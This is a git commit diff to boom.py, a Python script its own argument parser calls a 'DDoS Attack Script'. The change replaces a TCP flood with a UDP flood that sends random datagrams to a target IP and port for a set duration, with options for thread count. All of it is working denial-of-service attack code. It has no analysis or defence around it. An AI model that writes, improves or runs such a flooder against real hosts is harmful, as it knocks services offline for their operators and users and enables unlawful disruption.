55b9e50409b62ac1a4ee421af680eb8d8f388f35
KTmodz <113619086+KTmodz@users.noreply.github.com>
2024-06-19 21:54:54 +0600

    Update boom.py

--- boom.py
+++ boom.py
@@ -11,41 +11,27 @@ class DDoS:
         self.target = ip
         self.port = port
         self.duration = duration
-        self.stop = False
 
     def attack(self):
-        print(f"[*] Starting attack on {self.target}:{self.port} for {self.duration} seconds...")
+        print(f"[*] Starting UDP attack on {self.target}:{self.port} for {self.duration} seconds...")
         start_time = time.time()
-        while not self.stop:
+        while time.time() - start_time < self.duration:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((self.target, self.port))
-                s.sendto(random._urandom(2048), (self.target, self.port))
-                s.sendto(random._urandom(2048), (self.target, self.port))
-                s.sendto(random._urandom(2048), (self.target, self.port))
-                s.sendto(random._urandom(2048), (self.target, self.port))
-                s.sendto(random._urandom(2048), (self.target, self.port))
-                s.close()
-            except socket.error:
-                print(f"[*] Server is down! Exiting...")
-                break
-            except KeyboardInterrupt:
-                break
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                data = random._urandom(1024)  # Generate random data to send
+                s.sendto(data, (self.target, self.port))
+                print(f"\033[92m.\033[0m", end="", flush=True)  # Print dot for each packet sent
             except Exception as e:
                 print(f"[*] Error: {str(e)}")
 
-            # Check if the duration has elapsed
-            if time.time() - start_time >= self.duration:
-                break
+            time.sleep(0.01)  # Adjust delay between packets for optimal performance
 
-    def stop_attack(self):
-        self.stop = True
+        print(f"\n[*] UDP attack finished on {self.target}:{self.port}")
 
 def parse_args():
-    parser = argparse.ArgumentParser(description="DDoS Attack Script")
+    parser = argparse.ArgumentParser(description="DDoS UDP Attack Script")
     parser.add_argument("--ip", dest="ip", required=True, help="Target IP address")
     parser.add_argument("--port", dest="port", type=int, required=True, help="Target port number")
-    parser.add_argument("--times", dest="times", type=int, required=True, help="Number of times to attack")
     parser.add_argument("--threads", dest="threads", type=int, required=True, help="Number of threads to use")
     parser.add_argument("--duration", dest="duration", type=int, required=True, help="Duration of attack in seconds")
     return parser.parse_args()
@@ -54,7 +40,6 @@ def main():
     args = parse_args()
     ip = args.ip
     port = args.port
-    times = args.times
     threads = args.threads
     duration = args.duration
 
